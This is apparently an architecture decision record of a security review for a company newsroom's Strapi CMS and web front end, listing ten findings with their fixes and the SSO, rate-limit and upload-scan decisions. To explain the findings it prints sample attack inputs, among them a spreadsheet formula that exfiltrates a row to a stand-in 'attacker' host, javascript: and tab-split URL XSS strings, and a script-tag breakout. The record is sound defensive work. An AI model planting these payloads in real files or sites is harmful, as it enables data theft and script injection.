# ADR-006 — Launch security posture (P7)

- **Status:** Accepted
- **Date:** 2026-07 (P7)
- **Relates to:** plan §9 (P7), Req §2/§4/§8, assumptions A3 and A6
- **Companion:** [ADR-007](007-csp-without-nonces.md) for the CSP trade-off

## Context

P7's Definition of Done: "Security review passed (XSS/CSRF/injection, rate limit,
session timeout); SSO/MFA + virus scan wired." A3 and A6 deferred SSO and upload
scanning to this phase.

The framing decision that drives everything below:

> **An editor is not a trust boundary.**

Every string on the public site is authored by someone holding a
Contributor-or-above CMS account. Roles exist precisely because those accounts are not
uniformly trusted, and a corporate newsroom has contractors, interns and a broad
approval chain. So CMS content is untrusted input in the same sense form input is.

## What the review found

Ranked by what an attacker would actually do with them.

### 1. Unpublished content was readable by anyone — the highest-severity finding

Strapi 5's core service defaults reads to published content:

```js
getFetchParams(params) { return { status: 'published', ...params } }
```

`status` is on `ALLOWED_QUERY_PARAM_KEYS`, so a **client-supplied** `status` lands in
`params` and overrides that default. The Content API has no separate "read drafts"
permission: any caller who can `find` can also `find?status=draft`.

`GET /api/articles?status=draft` therefore returned unpublished content to the open
internet — embargoed press releases, financial results before disclosure, drafts with
provisional numbers. For a listed company's newsroom this is a disclosure incident, not
a bug. It is also the exact thing §4.5's Draft → Review → Approved workflow exists to
stage.

**Fix:** `apps/cms/src/middlewares/draft-guard.ts` — non-published reads require a
`full-access` API token; anything else is a 403. `publicationFilter` and
`hasPublishedVersion` are blocked too, being draft-vs-published cohort selectors and
therefore an existence oracle even when the returned rows are published-only.

It is a **document-service** middleware, and that is forced rather than chosen: Strapi
composes authentication *inside* each route (`authenticate → authorize → policies →
route middlewares → action`), so a global Koa middleware cannot see `ctx.state.auth`.
A document-service middleware runs after authentication and covers every content type
automatically — including the next one somebody adds.

A 403, not a silent downgrade to published: a downgrade would hide both an attack and
a misconfigured preview token behind pages that merely look stale.

### 2. The entire Content API was unauthenticated

The `public` role had read on every content type. Convenient, and it meant there was
nothing to key abuse response on but IP, no way to revoke access short of editing
permissions by hand, and every future content type public by default.

**Fix:** token-authenticated by default. Public read permissions are actively
**revoked** on boot (not merely "not granted" — an already-bootstrapped database keeps
them), and the web app authenticates with a read-only API token.
`CMS_PUBLIC_READ=true` restores the old behaviour for local development and is
**ignored when `NODE_ENV=production`**.

The read-only token is provisioned from env at boot, so `docker compose up` exercises
the authenticated path. An auth model only tested in production is an auth model
nobody has tested.

### 3. Editor-authored URLs reached DOM sinks unchecked

`SmartLink` sent any CMS `href` straight to an anchor. `javascript:alert(document.cookie)`
in a nav item or CTA is stored XSS on the corporate homepage. The `embed` block put a
CMS URL directly in an `iframe src`. The redirect resolver passed a CMS `to` and
`statusCode` into `NextResponse.redirect`, where a status of 350 — inside the schema's
own 300–399 range — throws a `RangeError` *inside middleware* and 500s every request
for that path.

**Fix:** `packages/shared/src/security/url.ts` — `safeHref`, `safeFrameSrc`,
`safeRedirect`, `safePreviewPath`, applied at every sink. Notably these **reject
embedded control characters** rather than stripping them, because browsers ignore
TAB/LF/CR *inside* a scheme, so `java\tscript:alert(1)` executes while defeating a
naive `startsWith("javascript:")` check.

### 4. JSON-LD `</script>` breakout in the FAQ block

`components/seo/json-ld.tsx` correctly escapes `<`, but `blocks/faq.tsx` had its own
inline `dangerouslySetInnerHTML` that did not. An FAQ answer containing
`</script><script>…` would break out and execute.

**Fix:** route it through `JsonLd`. There are now exactly two such call sites, both
escaped.

### 5. CSV formula injection in the audit export

Spreadsheets evaluate a cell beginning `=`, `+`, `-` or `@`, and quoting does not help
— they strip quotes before evaluating. The audit log contains editor-written rejection
reasons, so `=WEBSERVICE("https://attacker/?"&A1)` exfiltrates the row the moment a
compliance reviewer opens the export.

**Fix:** `toCsv` in `@vng/shared` neutralises formula prefixes with a `'`.

### 6. Audit reads were open to any authenticated admin

`type: "admin"` routes prove only that the caller is *some* admin user, so a
Contributor or Viewer could read and bulk-export every rejection comment and the titles
of unpublished work across the newsroom.

**Fix:** `auditRead` / `auditExport` in the RBAC matrix, plus a row cap on export so an
unfiltered query cannot exhaust memory.

### 7. Replayable revalidation webhook

P3's HMAC gave authenticity but not freshness. A captured POST replayed indefinitely
forces a cluster-wide cache purge plus a full regeneration storm against Strapi on
every replay — an amplified DoS using an entirely authentic message, aimed at the one
path §5.3 depends on.

**Fix:** the timestamp is signed *with* the body (`<unix-seconds>.<body>`) and the
receiver rejects anything outside ±5 min. Signing it *into* the payload is the point: a
bare timestamp header the HMAC did not cover could simply be rewritten by the replayer.

### 8. No response security headers at all

**Fix:** `apps/web/lib/security-headers.ts` — CSP, HSTS, `X-Content-Type-Options`,
`Referrer-Policy`, `X-Frame-Options`, `Permissions-Policy`,
`Cross-Origin-Opener-Policy`, and `no-store` on `/api/*`. Asserted on the wire by
`qa/e2e/security-headers.spec.ts`. The CSP trade-off is [ADR-007](007-csp-without-nonces.md).

### 9. Unbounded query and body limits

`maxLimit` was `null`, so `?pagination[pageSize]=100000&populate=*` asked Postgres for
the whole catalogue with every relation joined, in one request. Body limits were
Strapi's ~200 MB defaults.

**Fix:** `config/api.ts` (`maxLimit: 100`, `strictParams: true`) and body caps in
`config/middlewares.ts`.

### 10. Local plugins never loaded in production

Covered in [ADR-004](004-editorial-workflow-on-ce.md), because it is a packaging
failure rather than a security control — but the *effect* was a missing audit log,
which is a compliance gap. `assert-plugins.ts` now fails the boot rather than shipping
a half-functional CMS.

## Decisions

### Fail-open vs fail-closed is decided per control, by blast radius

| Control | On failure | Why |
|---|---|---|
| Virus scanner (clamd down) | **closed** | Blocks one upload. Serving malware from `vng.com.vn` is a takedown and a customer-trust event. |
| Redirect resolver (CMS down) | **open** | A CMS outage must not break navigation on the whole site. |

The rule: failing open blocks nobody, failing closed blocks one action. Size the
decision by what the failure actually costs.

> **Amended by [ADR-008](008-single-instance.md).** This table used to include two
> Redis-dependent rows — the rate limiter failing **open** and the cache handler
> degrading to no-cache. Neither applies now: Redis is gone, both rate limiters count
> in process, and there is no external dependency left to be unavailable. The limiters
> are therefore always in force, which is stricter than what this ADR originally
> specified.

### Rate limiting is per-instance on both apps

Both limiters count in process memory. This is sound only because each app runs as a
single instance ([ADR-008](008-single-instance.md)), which makes per-instance the whole
deployment.

The constraint is load-bearing for the CMS limiter, because it fronts admin login: with
N instances an attacker gets `limit × N` attempts and can round-robin so no single
instance ever sees enough failures to trip. For credential stuffing that difference
*is* the control. `RATE_LIMIT_INSTANCES` divides the budgets as a partial mitigation;
it cannot make counting shared, which is why scaling out is an ADR decision.

The web app's limiter would be fine either way. Both endpoints it guards are already
authenticated by a shared secret, so it is a second-order brake and a factor-of-N slack
does not change its value.

Two tier choices worth recording because they are availability bugs waiting to happen:
`/admin/access-token` is **not** on the tight auth tier (every admin tab calls it every
15 minutes, so a 10-per-5-min budget would lock working editors out), and `/api/sso/*`
gets its own looser tier so a whole office behind one NAT'd egress IP is not throttled
out of logging in.

### Admin sessions

15-min access token, 30-min idle, 8-h absolute, and "remember me" capped to the same
8 h. Strapi's defaults are a 30-day refresh token and 14-day idle — a standing
credential on a shared newsroom workstation.

### SSO via OIDC, not SAML — §10.2 Q1 resolved

The plan defaulted to OIDC pending confirmation. **Confirmed: OIDC.** The reasoning
matters because it is the kind of thing that gets reopened: OIDC's JSON/JWT flow needs
no XML canonicalisation or XML-DSig, and XML signature wrapping is a decades-long
source of authentication-bypass bugs in SAML implementations. OIDC also carries MFA
assurance in a machine-readable way (`amr`/`acr`) rather than as an out-of-band
agreement. **If VNG's IdP turns out to be SAML-only, front it with an OIDC bridge
rather than hand-rolling SAML here.**

Strapi's `admin.auth.providers` is Enterprise-only, so the flow lives in
`apps/cms/src/plugins/sso`. It reuses `strapi.sessionManager('admin')` — the same
mechanism the local login controller uses — so SSO sessions inherit the lifetimes above
instead of being a parallel session system that quietly ignores them.

`openid-client` (the reference library, and the obvious choice) is **not usable**: v6+
is ESM-only and the Strapi server runs as CommonJS. Rather than pin an end-of-life v5,
the flow uses Node's built-in `crypto`, which has first-class JWK support — so nothing
cryptographic is hand-rolled, only the JWS framing. `HS*` and `none` are excluded from
the `alg` allow-list, since accepting `HS256` alongside `RS256` is the key-confusion
bypass.

Flow state (`state`, `nonce`, PKCE verifier) lives in short-lived httpOnly cookies
rather than server memory: with ≥2 tasks (A2) the callback frequently lands on a
different instance than the login, and memory-based state fails only under load — i.e.
in production. `SameSite=Lax` is required, not incidental, because the callback arrives
as a cross-site top-level GET.

`strapi-super-admin` is never assignable from an IdP group. Otherwise a group name
administered by a different team, on a different change-control process, would be
enough to mint full control of the CMS.

### Upload scanning: two modes, because they catch different things

**Inline** (`CLAMAV_HOST`) decorates the upload provider so bytes are scanned before
the object reaches S3 — this is what prevents *hosting* malware. **Async** (S3
`ObjectCreated` → Lambda/ClamAV → signed callback) catches objects that arrive by any
other route: an operator's `aws s3 cp`, a restored backup, a future direct-to-S3
upload. Defence in depth beats one perfect gate.

The Lambda has `s3:GetObject` and deliberately **not** `s3:DeleteObject`: deletion goes
through the CMS so the library row and the object are removed together and the deletion
lands in the audit log. A Lambda that deleted objects directly would leave the CMS
pointing at missing media with no record.

## Consequences

- `STRAPI_PREVIEW_TOKEN` must be a **full-access** Strapi token. A read-only token
  there fails silently by serving published copy in preview mode.
- Adding a content type now also means adding its read actions to
  `PUBLIC_READ_ACTIONS` — read actions only, since that array is what gets revoked.
- ClamAV is amd64-only, so the local compose service sits behind a `scan` profile
  rather than slowing every `docker compose up` under emulation. In AWS it is a
  sidecar in the CMS task definition.
- `EMBED_ALLOWED_ORIGINS` empty means `frame-src 'none'`. Wiring the IR/BU/DMF embeds
  (§0 A7) requires setting it, and forgetting to looks like "the embed block is
  broken".

## Revisit if

- Strapi adds a distinct draft-read permission to the Content API, which would let the
  draft guard be replaced with configuration.
- The IdP turns out to be SAML-only — see the bridge note above.
- A WAF (AWS WAF in front of CloudFront) is introduced, at which point IP-based rate
  limiting should move there and the application limiters can be relaxed to
  per-account budgets.
